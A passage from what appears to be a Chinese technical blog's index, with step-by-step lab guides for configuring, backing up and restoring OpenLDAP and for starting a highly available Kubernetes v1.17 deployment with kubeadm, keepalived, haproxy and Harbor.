-H ldapi:/// -f /etc/openldap/schema/cosine.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/collective.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/corba.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/duaconf.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/dyngroup.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/java.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/misc.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/openldap.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/pmi.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/ppolicy.ldif 3.2 修改配置 创建数据存放目录\nmkdir /data/ldap chown ldap.ldap /data/ldap/ 准备加密后的密码（加了盐）\n[root@centos7 ~]# slappasswd -s \u0026#34;passwd\u0026#34; {SSHA}5QOpyWl4FbzXo6RoFNCadFbcT1DsnCLJ 新增changedomain.ldif。根据需要修改olcSuffix、olcRootDN、olcRootPW、olcAccess等选项\ncat \u0026gt; changedomain.ldif \u0026lt;\u0026lt; EOF dn: olcDatabase={1}monitor,cn=config changetype: modify replace: olcAccess olcAccess: {0}to * by dn.base=\u0026#34;gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\u0026#34; read by dn.base=\u0026#34;cn=admin,dc=ldap,dc=com\u0026#34; read by * none dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcSuffix olcSuffix: dc=ldap,dc=com dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcRootDN olcRootDN: cn=admin,dc=ldap,dc=com dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcRootPW olcRootPW: {SSHA}5QOpyWl4FbzXo6RoFNCadFbcT1DsnCLJ dn: olcDatabase={2}hdb,cn=config changetype: modify replace: olcDbDirectory olcDbDirectory: /data/ldap dn: olcDatabase={2}hdb,cn=config changetype: modify add: olcAccess olcAccess: {0}to attrs=userPassword,shadowLastChange by dn=\u0026#34;cn=admin,dc=ldap,dc=com\u0026#34; write by anonymous auth by self write by * none olcAccess: {1}to dn.base=\u0026#34;\u0026#34; by * read olcAccess: {2}to * by dn=\u0026#34;cn=admin,dc=ldap,dc=com\u0026#34; write by * read EOF 执行命令，有5个modifying 表示修改全部修改成功\n[root@openldap ~]# ldapmodify -Y EXTERNAL -H ldapi:/// -f changedomain.ldif SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \u0026#34;olcDatabase={1}monitor,cn=config\u0026#34; modifying entry \u0026#34;olcDatabase={2}hdb,cn=config\u0026#34; modifying entry \u0026#34;olcDatabase={2}hdb,cn=config\u0026#34; modifying entry \u0026#34;olcDatabase={2}hdb,cn=config\u0026#34; modifying entry \u0026#34;olcDatabase={2}hdb,cn=config\u0026#34; modifying entry \u0026#34;olcDatabase={2}hdb,cn=config\u0026#34; 3.3 添加根节点 未添加根节点时客户端连接ldap服务会报错：\n新建 add-rootdn.ldif 文件\ncat \u0026gt; add-rootdn.ldif \u0026lt;\u0026lt; EOF dn: dc=ldap,dc=com objectClass: top objectClass: domain o: ldap EOF 执行命令添加根节点\n[root@openldap ~]# ldapadd -x -D cn=admin,dc=ldap,dc=com -W -f add-rootdn.ldif Enter LDAP Password: adding new entry \u0026#34;dc=ldap,dc=com\u0026#34; 再次使用客户端连接不再报错\n3.4 启用 memberof 功能 3.4.1 启用功能 新增add-memberof.ldif，#开启memberof 可以查询用户所属组，和第三方应用结合进行组过滤\ncat \u0026gt; add-memberof.ldif \u0026lt;\u0026lt; EOF dn: cn=module{0},cn=config cn: module{0} objectClass: olcModuleList objectclass: top olcModuleload: memberof.la olcModulePath: /usr/lib64/openldap dn: olcOverlay={0}memberof,olcDatabase={2}hdb,cn=config objectClass: olcConfig objectClass: olcMemberOf objectClass: olcOverlayConfig objectClass: top olcOverlay: memberof olcMemberOfDangling: ignore olcMemberOfRefInt: TRUE olcMemberOfGroupOC: groupOfUniqueNames olcMemberOfMemberAD: uniqueMember olcMemberOfMemberOfAD: memberOf EOF 新增refint1.ldif文件\ncat \u0026gt; refint1.ldif \u0026lt;\u0026lt; EOF dn: cn=module{0},cn=config add: olcmoduleload olcmoduleload: refint EOF 新增refint2.ldif文件\ncat \u0026gt; refint2.ldif \u0026lt;\u0026lt; EOF dn: olcOverlay=refint,olcDatabase={2}hdb,cn=config objectClass: olcConfig objectClass: olcOverlayConfig objectClass: olcRefintConfig objectClass: top olcOverlay: refint olcRefintAttribute: memberof uniqueMember manager owner EOF 依次执行下面命令，加载配置，顺序不能错\nldapadd -Q -Y EXTERNAL -H ldapi:/// -f add-memberof.ldif ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f refint1.ldif ldapadd -Q -Y EXTERNAL -H ldapi:/// -f refint2.ldif ### 执行结果 [root@openldap ~]# ldapadd -Q -Y EXTERNAL -H ldapi:/// -f add-memberof.ldif adding new entry \u0026#34;cn=module{0},cn=config\u0026#34; adding new entry \u0026#34;olcOverlay={0}memberof,olcDatabase={2}hdb,cn=config\u0026#34; [root@openldap ~]# ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f refint1.ldif modifying entry \u0026#34;cn=module{0},cn=config\u0026#34; [root@openldap ~]# ldapadd -Q -Y EXTERNAL -H ldapi:/// -f refint2.ldif adding new entry \u0026#34;olcOverlay=refint,olcDatabase={2}hdb,cn=config\u0026#34; 3.4.2 验证结果 使用客户端连接ldap 服务，创建test用户 两种类型的组（Group和groupOfUniqueNames）\nGroup 以 memberUid 来表示所属关系\ngroupOfUniqueNames 以 uniqueMember来表示所属关系\n然后使用如下查询语句可以查询到test 用户所属的组(很明显只有groupOfUniqueNames类型的组支持），表示 memberOf 功能添加成功！\n[root@openldap ~]# ldapsearch -x -LLL -H ldap:/// -D cn=admin,dc=ldap,dc=com -W -b uid=test,dc=ldap,dc=com memberOf Enter LDAP Password: dn: uid=test,dc=ldap,dc=com memberOf: cn=groupOfUniqueNames\\20,dc=ldap,dc=com 3.5 启用日志轮转 默认情况，ldap并没有启用日志记录功能，这里根据需要开启日志功能\n新增文件loglevel.ldif\n#vim loglevel.ldif dn: cn=config changetype: modify replace: olcLogLevel olcLogLevel: stats 执行命令启用日志\nldapmodify -Y EXTERNAL -H ldapi:/// -f loglevel.ldif 配置日志\nsed -i \u0026#34;/^local7/ a local4.* /var/log/slapd/slapd.log \u0026#34; /etc/rsyslog.conf systemctl restart rsyslog 查看日志是否生成\ntail /var/log/slapd.log #若未看到日志，则重启slapd服务再次观察 启用日志轮转功能\ncat \u0026gt; /etc/logrotate.d/slapd \u0026lt;\u0026lt;EOF /var/log/slapd/slapd.log{ daily rotate 5 copytruncate dateext missingok } EOF systemctl restart rsyslog 验证日志轮转结果\n[root@openldap ldip]# logrotate -f /etc/logrotate.d/slapd [root@openldap ldip]# ll /var/log/slapd/ total 4 -rw------- 1 root root 0 Jan 17 16:00 slapd.log -rw------- 1 root root 486 Jan 17 16:00 slapd.log-20230117 3.6 关闭匿名登录 ldap默认是可以通过匿名登录的（拥有查询权限），从安全角度考虑，需要禁用此功能\n匿名查询\n[root@openldap ~]# ldapsearch -x -LLL -b uid=test,dc=ldap,dc=com memberOf dn: uid=test,dc=ldap,dc=com memberOf: cn=groupOfUniqueNames\\20,dc=ldap,dc=com 新建文件disable_anon.ldif\ncat \u0026gt; disable_anon.ldif \u0026lt;\u0026lt; EOF dn: cn=config changetype: modify add: olcDisallows olcDisallows: bind_anon dn: cn=config changetype: modify add: olcRequires olcRequires: authc dn: olcDatabase={-1}frontend,cn=config changetype: modify add: olcRequires olcRequires: authc EOF 执行命令修改配置\n[root@openldap ~]# ldapadd -Y EXTERNAL -H ldapi:/// -f disable_anon.ldif SASL/EXTERNAL authentication started SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth SASL SSF: 0 modifying entry \u0026#34;cn=config\u0026#34; modifying entry \u0026#34;cn=config\u0026#34; modifying entry \u0026#34;olcDatabase={-1}frontend,cn=config\u0026#34; 成功关闭匿名查询\n[root@openldap ~]# ldapsearch -x -LLL -b uid=test,dc=ldap,dc=com memberOf ldap_bind: Inappropriate authentication (48) additional info: anonymous bind disallowed 四、数据备份与恢复 openldap的数据备份，可以通过slapcat和ldapsearch两种方式来进行。 openldap的数据恢复，则使用slapadd命令。\n4.1 使用 slapcat 备份 slapcat命令只能在openldap服务器上执行\n[root@openldap ~]# slapcat -n 2 -l ~/ldap_bak.ldif 651baa6a hdb_db_open: warning - no DB_CONFIG file found in directory /data/ldap: (2). Expect poor performance for suffix \u0026#34;dc=ldap,dc=com\u0026#34;. # 数据保存在文件中 [root@openldap ~]# head ldap_bak.ldif dn: dc=ldap,dc=com objectClass: top objectClass: domain o: ldap structuralObjectClass: domain dc: ldap entryUUID: ee1ed588-f5f2-103d-9e31-430d06141758 creatorsName: cn=admin,dc=ldap,dc=com createTimestamp: 20231003044158Z entryCSN: 20231003044158.023887Z#000000#000#000000 4.2 使用 ldapsearch 备份 ldapsearch命令可以在openldap服务器或者openldap客户端上执行\nldapsearch -x -D \u0026#34;cn=admin,dc=ldap,dc=com\u0026#34; -w \u0026#34;passwd\u0026#34; -b \u0026#34;dc=ldap,dc=com\u0026#34; -LLL -H ldap://10.0.0.2 \u0026gt; ~/ldap_bak.ldif 以上是使用用户密码验证方式备份，如果openldap允许匿名访问的话，执行命令如下：\nldapsearch -x -b \u0026#34;dc=ldap,dc=com\u0026#34; -H ldap://10.0.0.2 -LLL \u0026gt; ~/ldap_bak.ldif 4.3 备份指定 basedn 数据 例如，只备份用户数据，可以指定用户所在basedn，例如：cn=users,dc=ldap,dc=com\nldapsearch -x -D \u0026#34;cn=admin,dc=ldap,dc=com\u0026#34; -w \u0026#34;passwd\u0026#34; -b \u0026#34;cn=users,dc=ldap,dc=com\u0026#34; -LLL -H ldap://10.0.0.2 \u0026gt; ~/uesrs_bak.ldif 4.4 全量数据恢复 关闭openldap服务，并删除数据\nsystemctl stop slapd rm -rf /var/lib/ldap/* 导入openldap备份数据\nslapadd -l ~/ldap_bak.ldif 复制DB配置文件\ncp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG chown ldap:ldap -R /var/lib/ldap/ 启动OpenLDAP服务\nsystemctl start slapd 4.5 恢复指定 basedn 数据 恢复指定basedn数据时，需要只有basedn的备份数据，或从全量数据中摘出来需要恢复的basedn数据的单独ldif文件 例如，恢复用户所在的basedn数据\nldapadd -H ldap://10.0.0.2 -x -D \u0026#34;cn=admin,dc=ldap,dc=com\u0026#34; -w \u0026#34;password\u0026#34; -f ~/uesrs_bak.ldif 需要注意的是，要提前确保需要恢复的basedn和basedn下的数据不能重复，否则遇到重复的数据会失败并退出，可以提前将重复的数据删除再进行恢复或者恢复到一个新的basedn（需要改备份文件的basedn相关内容）\n4.6 备份脚本 #!/bin/bash LDAPBK=ldap-$( date +%Y%m%d-%H ).ldif BACKUPDIR=/root/ldap_backups BACKUP_EXEC=`which slapcat` PACKAGE=`which gzip` FIND=`which find` checkdir(){ if [ ! -d \u0026#34;$BACKUPDIR\u0026#34; ]; then mkdir -p ${BACKUPDIR} fi } backuping(){ echo \u0026#34;Backup Ldap Start....\u0026#34; ${BACKUP_EXEC} -n 2 -l ${BACKUPDIR}/${LDAPBK} ${PACKAGE} -9 $BACKUPDIR/$LDAPBK } delete_expired_files() { ${FIND} $BACKUPDIR/ -ctime +30 -name \u0026#34;*.gz\u0026#34; -exec rm {} \\; } checkdir backuping delete_expired_files 定时备份\ncrontab -e 0 2 * * * /path/ldap_backup.sh 参考链接 slapd-config(5) (openldap.org)\nhttps://chenzhonzhou.github.io/2020/11/03/openldap-yum-an-zhuang/\nOpenLDAP 数据备份与恢复 | 凡间的精灵\nhttps://wandouduoduo.github.io/articles/3337f7d4.html\n","permalink":"https://senmer.github.io/zh/posts/tech/ldap/openldap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/","summary":"一、OpenLDAP简介 LDAP是一款轻量级目录访问协议（Lightweight Directory Access Protocol，简称LDAP），属于开源集中账号管理架构的实现，且支持众多系统版本，被广大互联网公司所采用。 LDAP提供并实现目录服务的信息服务，目录服务是一种特殊的数据库系统，对于数据的读取、","title":"OpenLDAP安装和使用"},{"content":"一、 简介 1.1 k8s 是什么 Kubernetes（通常被简称为K8s）是一个开源的容器编排和管理平台，用于自动化容器化应用程序的部署、扩展和操作。它由Google开发并捐赠给了云原生计算基金会（CNCF）。Kubernetes旨在解决容器化应用程序的管理和部署问题，使开发人员能够更轻松地构建、交付和运行容器化应用。\n1.2 k8s 的优势 Kubernetes 是一个开源的容器编排平台，它提供了一种管理容器化应用程序的强大方式。以下是 Kubernetes 的一些优势：\n自动化和自我修复： Kubernetes 可以自动监测应用程序状态并进行自我修复，确保应用持续稳定运行。如果某个容器或节点发生故障，Kubernetes 会自动重新启动容器或迁移工作负载。 弹性扩展： Kubernetes 允许根据需要扩展或缩减应用程序实例的数量。这种自动扩展能力可根据负载自动调整应用的规模，以满足流量需求，同时在需求减少时节约资源。 负载均衡： Kubernetes 支持内置的负载均衡，可以将传入的流量分发到不同的容器实例中，确保应用程序能够有效地处理高流量。 自动部署和滚动更新： 通过声明式的配置，Kubernetes 允许你轻松地进行应用程序的部署和更新。滚动更新功能可以逐步替换旧版本的容器，从而减少应用程序的停机时间。 多环境支持： Kubernetes 支持多个环境（例如开发、测试、生产）之间的轻松迁移，确保应用在不同阶段的一致性。 声明式配置： 你可以使用 Kubernetes 的 YAML 文件来定义应用程序的配置和部署要求。这种声明式的方法让你能够更清晰地定义应用程序状态，而 Kubernetes 负责将系统状态调整为所需状态。 自定义资源和扩展性： Kubernetes 允许你创建自定义资源和控制器，从而可以扩展平台的功能，满足特定应用程序或业务的需求。 多种容器运行时支持： Kubernetes 支持多种容器运行时，如 Docker、Containerd 等，使你可以选择最适合你的应用的运行时环境。 社区支持和生态系统： Kubernetes 拥有庞大的社区和丰富的生态系统，有大量的工具、插件和服务，可以帮助你更好地管理、监控和扩展你的应用程序。 跨云和本地环境： Kubernetes 可以在不同的云平台和本地环境中运行，使你能够在不同的基础架构上保持一致的部署和管理体验。 总之，Kubernetes 提供了强大的容器编排和管理功能，帮助开发人员和运维团队更有效地部署、扩展和管理容器化应用程序。它的优势在于自动化、弹性、灵活性以及丰富的生态系统。\n1.3 k8s 组件介绍 Kubernetes（通常简称为K8s）由多个组件组成，这些组件共同协作以管理容器化应用程序的生命周期。以下是常见的 Kubernetes 组件及其功能介绍：\nKubelet： 运行在每个节点上的代理，负责管理容器的生命周期。它与 Master 节点通信，确保容器在节点上按照所需的状态运行。 Kube-Proxy： 也运行在每个节点上，维护网络规则以实现 Service 暴露和负载均衡。它根据 Service 配置更新节点上的 iptables 规则。 Kube-Scheduler： 负责监视新创建的 Pod，并根据各种条件（如资源需求、亲和性、亲和性等）将其调度到集群中的适当节点上。 Kube-Controller-Manager： 包含多个控制器，用于监控集群状态并根据需要进行自动修复。其中一些控制器包括： Replication Controller 和 ReplicaSet 控制器： 确保在集群中运行指定数量的 Pod 副本。 Deployment 控制器： 管理应用程序的滚动更新和版本控制。 Namespace 控制器： 管理命名空间的创建、更新和删除。 Etcd： 是一个分布式键值存储系统，用于存储集群的配置信息、状态和元数据。Kubernetes 使用 Etcd 来存储所有关键信息，包括配置、部署和服务发现。 API Server： 提供了 Kubernetes 集群的 API，允许用户和其他组件与集群进行交互。所有的资源和操作都通过 API Server 进行访问和管理。 Container Runtime： 负责运行容器，常见的容器运行时包括 Docker、Containerd 等。 Controller Manager： 包含一系列控制器，这些控制器可以监控集群中的资源状态，并确保所需状态与实际状态保持一致。 Cloud Controller Manager： 在云平台上运行，用于集成 Kubernetes 集群与特定云提供商的功能，如自动扩展、负载均衡等。 Admission Controllers： 用于拦截和修改进入 Kubernetes 集群的请求。这些控制器可以执行验证、默认值设置和修改请求，以确保遵循集群策略。 Ingress Controller： 管理 Ingress 资源，将外部流量引导到集群内部的服务。 Pods： 是 Kubernetes 的最小调度单位，可以包含一个或多个容器。它们可以共享网络和存储，形成一个逻辑单元。 Services： 用于定义一组 Pod 的访问方式，提供负载均衡和服务发现功能，使应用程序能够在不同的 Pod 之间进行通信。 ConfigMaps 和 Secrets： 用于将配置和机密信息与应用程序分开，并在容器中以环境变量或卷的形式提供。 这些组件一起协同工作，使 Kubernetes 能够提供强大的容器编排和管理功能。每个组件都扮演着不同的角色，确保容器化应用程序能够以高可用性、自动化和弹性的方式运行。\n二、k8s 安装部署（kubeadm） 注意：本文安装的 k8s 版本为 v1.17.11，不能直接通过 kubeadm 执行升级操作。如果需要进行升级操作，需要满足 version \u0026gt;= 1.18.0\n2.1 安装方式 Kubernetes 的安装可以分为多种方式，根据你的需求和环境选择合适的安装方式。以下是一些常见的 Kubernetes 安装方式：\nMinikube： 如果你想在本地开发环境中快速搭建一个单节点的 Kubernetes 集群，可以使用 Minikube。Minikube 创建一个虚拟机，并在其中运行一个单节点的 Kubernetes 集群。适合学习和开发目的。\nKubeadm： Kubeadm 是一个官方维护的工具，用于在生产环境中快速部署 Kubernetes 集群。它可以在多个节点上设置一个高度可配置的集群，适用于较小规模的生产环境。\nKubespray（原先叫Kargo）： Kubespray 是一个开源项目，用于部署高度定制化的 Kubernetes 集群。它支持多种操作系统和云平台，并且可以根据配置要求进行定制化部署。\nManaged Kubernetes Services： 主要云提供商（如AWS、Google Cloud、Azure）提供托管的 Kubernetes 服务，如Amazon EKS、Google Kubernetes Engine（GKE）、Azure Kubernetes Service（AKS）。这些服务会为你自动管理集群的维护、升级和可用性。\nRancher： Rancher 是一个开源的容器管理平台，可以帮助你在不同的基础设施上轻松部署和管理 Kubernetes 集群。\nK3s： K3s 是一个轻量级的 Kubernetes 发行版，旨在为资源受限的环境（如边缘计算）提供更轻便的安装和管理。\n自定义安装脚本： 你可以根据 Kubernetes 的官方文档，在自己的环境中编写自定义的安装脚本。这样可以更好地适应特定需求和架构。\n对于初学者来说，Minikube 和 Managed Kubernetes Services 是较为简单的入门方式。而对于生产环境，Kubeadm、Kubespray 和 Rancher 提供了更大的灵活性和控制权。在选择安装方式时，考虑到你的技术水平、部署规模和所在的基础设施环境是很重要的。无论选择哪种方式，确保参考官方文档和最佳实践来确保安装的正确性和可靠性。\n2.2 部署过程 安装前准备：\n禁用 swap 分区\n关闭 selinux\n关闭 iptables、NetworkManager 服务\n同步服务器时间\n# ntpdate ntp.aliyun.com # hwclock -w 优化内核参数并修改资源限制\n[root@centos7 ~]# cat /etc/sysctl.conf net.ipv4.ip_forward = 1 net.bridge.bridge-nf-call-iptables = 1 net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-arptables = 1 net.ipv4.tcp_tw_reuse = 0 net.ipv4.ip_nonlocal_bind = 1 net.core.somaxconn = 32768 net.netfilter.nf_conntrack_max = 1000000 vm.swappiness = 0 vm.max_map_count = 655360 fs.file-max = 655360 [root@centos7 ~]# cat /etc/security/limits.conf #\u0026lt;domain\u0026gt; \u0026lt;type\u0026gt; \u0026lt;item\u0026gt; \u0026lt;value\u0026gt; * soft core unlimited * hard core unlimited * soft nproc 1000000 * hard nproc 1000000 * soft nofile 1000000 * hard nofile 1000000 * soft memlock 24800 * hard memlock 24800 * soft msgqueue 8192000 * hard msgqueue 8192000 root soft core unlimited root hard core unlimited root soft nproc 1000000 root hard nproc 1000000 root soft nofile 1000000 root hard nofile 1000000 root soft memlock 24800 root hard memlock 24800 root soft msgqueue 8192000 root hard msgqueue 8192000 2.2.1 具体步骤 基础环境准备 部署 harbor 和 haproxy 高可用反向代理，实现控制节点 API 的高可用 在所有 master 节点安装指定的 kubeadm、kubelet、kubectl、docker 在所有 node 节点按爪给你指定版本的 kubeadm、docker、kubelet（可选） 在 master 节点运行 kubeadm ini 初始化命令创建集群 验证 master 节点状态 在 node 节点使用 kubeadm 命令将自身加入集群 验证 ndoe 节点状态 创建 pod 并测试网络是否正常 部署 dashboard 集群升级 2.2.2 部署环境 如果是虚拟化环境，最好每个重要节点做好快照\n**操作系统：**Centos 7.8\n**安装方式：**最小化安装\n**部署方式：**VMware 16 Pro\n角色 主机名 IP 配置 k8s-master-01 master-01.example.local 10.0.0.11 2U 2G k8s-master-02 master-02.example.local 10.0.0.12 2U 2G k8s-master-03 master-03.example.local 10.0.0.13 2U 2G ha-01 ha-01.example.local 10.0.0.14 1U 2G ha-02 ha-02.example.local 10.0.0.15 1U 2G harbor harbor.example.local 10.0.0.16 2U 4G node-01 node-01.example.local 10.0.0.17 1U 2G node-02 node-02.example.local 10.0.0.18 1U 2G node-03 node-03.example.local 10.0.0.19 1U 2G 2.3 部署高可用反向代理 基于 Keepalived + haprox实现高可用反向代理，实现 k8s apiserver 服务的高可用\nha-01：\nyum install -y keepalived yum install -y haproxy cp /usr/share/doc/keepalived-1.3.5/samples/keepalived.conf.vrrp /etc/keepalived/keepalived.conf [root@ha-01 ~]# cat /etc/keepalived/keepalived.conf ! Configuration File for keepalived global_defs { notification_email { acassen } notification_email_from Alexandre.Cassen@firewall.loc smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id LVS_DEVEL } vrrp_instance k8s { state MASTER interface eth0 garp_master_delay 10 smtp_alert virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 10.0.0.188 label eth0:1 10.0.0.199 label eth0:2 } } [root@ha-01 ~]# tail -n 60 /etc/haproxy/haproxy.cfg ... defaults mode http log global option httplog option dontlognull option http-server-close option forwardfor except 127.0.0.0/8 option redispatch retries 3 timeout http-request 10s timeout queue 1m timeout connect 10s timeout client 1m timeout server 1m timeout http-keep-alive 10s timeout check 10s maxconn 3000 listen stats mode http bind 0.0.0.0:9999 stats enable log global stats uri /haproxy-status stats auth admin:passwd listen k8s-apiserver-6443 bind 10.0.0.188:6443 mode tcp balance roundrobin server 10.0.0.11 10.0.0.11:6443 check inter 3s fall 3 rise 5 server 10.0.0.12 10.0.0.12:6443 check inter 3s fall 3 rise 5 server 10.0.0.13 10.0.0.13:6443 check inter 3s fall 3 rise 5 listen k8s-node-80 bind 10.0.0.199:80 mode tcp balance roundrobin server 10.0.0.17 10.0.0.17:30004 check inter 3s fall 3 rise 5 server 10.0.0.18 10.0.0.18:30004 check inter 3s fall 3 rise 5 server 10.0.0.19 10.0.0.19:30004 check inter 3s fall 3 rise 5 [root@ha-01 ~]# systemctl enable --now keepalived.service [root@ha-01 ~]# systemctl enable --now haproxy.service ha2:\nyum install -y keepalived yum install -y haproxy cp /usr/share/doc/keepalived-1.3.5/samples/keepalived.conf.vrrp /etc/keepalived/keepalived.conf [root@ha-01 ~]# cat /etc/keepalived/keepalived.conf ! Configuration File for keepalived global_defs { notification_email { acassen } notification_email_from Alexandre.Cassen@firewall.loc smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id LVS_DEVEL } vrrp_instance k8s { state MASTER interface eth0 garp_master_delay 10 smtp_alert virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 10.0.0.188 label eth0:1 10.0.0.199 label eth0:2 } } [root@ha-02 ~]# tail -n 60 /etc/haproxy/haproxy.cfg ... defaults mode http log global option httplog option dontlognull option http-server-close option forwardfor except 127.0.0.0/8 option redispatch retries 3 timeout http-request 10s timeout queue 1m timeout connect 10s timeout client 1m timeout server 1m timeout http-keep-alive 10s timeout check 10s maxconn 3000 listen stats mode http bind 0.0.0.0:9999 stats enable log global stats uri /haproxy-status stats auth admin:passwd listen k8s-apiserver-6443 bind 10.0.0.188:6443 mode tcp balance roundrobin server 10.0.0.11 10.0.0.11:6443 check inter 3s fall 3 rise 5 server 10.0.0.12 10.0.0.12:6443 check inter 3s fall 3 rise 5 server 10.0.0.13 10.0.0.13:6443 check inter 3s fall 3 rise 5 listen k8s-node-80 bind 10.0.0.199:80 mode tcp balance roundrobin server 10.0.0.17 10.0.0.17:30004 check inter 3s fall 3 rise 5 server 10.0.0.18 10.0.0.18:30004 check inter 3s fall 3 rise 5 server 10.0.0.19 10.0.0.19:30004 check inter 3s fall 3 rise 5 [root@ha-02 ~]# systemctl enable --now keepalived.service [root@ha-02 ~]# systemctl enable --now haproxy.service # vip 在 ha-01 节点 [root@ha-01 ~]# ifconfig eth0:1 eth0:1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.0.0.188 netmask 255.255.255.255 broadcast 0.0.0.0 ether 00:0c:29:cd:4b:70 txqueuelen 1000 (Ethernet) [root@ha-01 ~]# ifconfig eth0:2 eth0:2: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.0.0.199 netmask 255.255.255.255 broadcast 0.0.0.0 ether 00:0c:29:cd:4b:70 txqueuelen 1000 (Ethernet) 浏览器查看状态页\n2.4 部署 harbor https://goharbor.io/docs/2.9.0/install-config/installation-prereqs/\nhttps://docs.docker.com/engine/install/centos/\nsudo yum remove -y docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine # 安装 docker sudo yum install -y yum-utils sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo sudo yum install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin systemctl enable --now docker [root@harbor harbor]# docker -v Docker version 24.0.6, build ed223bc # 下载并安装 harbor wget https://github.com/goharbor/harbor/releases/download/v2.8.4/harbor-offline-installer-v2.8.4.tgz tar xf harbor-offline-installer-v2.8.4.tgz cd harbor [root@harbor harbor]# cp harbor.yml.tmpl harbor.yml # 关闭 https [root@harbor harbor]# grep -A 7 \u0026#34;https related config\u0026#34; harbor.yml # https related config #https: # # https port for harbor, default is 443 # port: 443 # # The path of cert and key files for nginx # certificate: /your/certificate/path # private_key: /your/private/key/path # 修改 hostname [root@harbor harbor]# grep -m 1 hostname: harbor.yml hostname: harbor.example.local # 修改密码 [root@harbor harbor]# grep -m 1 passwd harbor.yml harbor_admin_password: passwd # 开始安装 ./install.sh # docker-compose 安装路径 [root@harbor harbor]# rpm -ql docker-compose-plugin |grep docker-compose /usr/libexec/docker/cli-plugins/docker-compose 登录 harbor 并创建项目\n注意： 自行在 window 主机添加 hosts 解析 10.0.0.16 harbor.example.local\n2.5 所有节点安装 docker Release v1.17.11 · kubernetes/kubernetes (github.com)\n所有节点（这里专指 master 和 node）安装 docker\n注意： 生产环境要选择 k8s 指定的版本，具体查阅对应版本的 CHANGELOG\nkubernetes/CHANGELOG/CHANGELOG-1.17.md at master · kubernetes/kubernetes (github.com)\n安装指定版本的 docker\nsudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine sudo yum install -y yum-utils sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo # 这里直接安装 19.03.9-3 版本的 docker # yum list docker-ce --showduplicates | sort -r | grep 19.03 docker-ce.x86_64 3:19.03.9-3.el7 docker-ce-stable # sudo yum install -y docker-ce-19.03.9 docker-ce-cli-19.03.9 containerd.io docker-compose-plugin # docker version Client: Docker Engine - Community Version: 19.03.9 API version: 1.40 Go version: go1.13.10 Git commit: 9d988398e7 Built: Fri May 15 00:25:27 2020 OS/Arch: linux/amd64 Experimental: false Server: Docker Engine - Community Engine: Version: 19.03.9 # 由于 harbor 仓库未启用 https ，因此需要在 service 文件加上该参数 # dockerd --help |grep insec --insecure-registry list Enable insecure registry communication # grep insecure-registry /lib/systemd/system/docker.service ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --insecure-registry harbor.example.com # systemctl enable --now docker 2.6 所有节点安装集群初始化工具 2.6.1 配置国内镜像源 cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/ enabled=1 gpgcheck=0 repo_gpgcheck=0 gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF 2.6.2 安装初始化工具 注意：kubectl 是客户端命令，因此在 node 可以选择性安装\nyum install -y kubelet-1.17.11 kubectl-1.17.11 kubeadm-1.17.11 systemctl enable --now kubelet # 配置 kubeadm 子命令自动补全 mkdir ~/.kube/ kubeadm completion bash \u0026gt; ~/.kube/kubeadm_completion.sh source ~/.kube/kubeadm_completion.sh 2.6.3 kubeadm 命令的使用 查看帮助\nkubeadm --help 查看版本\n[root@master-01 ~]# kubeadm version kubeadm version: \u0026amp;version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;17\u0026#34;, GitVersion:\u0026#34;v1.17.11\u0026#34;, GitCommit:\u0026#34;ea5f00d93211b7c80247bf607cfa422ad6fb5347\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-08-13T15:17:52Z\u0026#34;, GoVersion:\u0026#34;go1.13.15\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 查看部署指定版本的集群所需要的镜像\n[root@master-01 ~]# kubeadm config images list --kubernetes-version v1.17.11 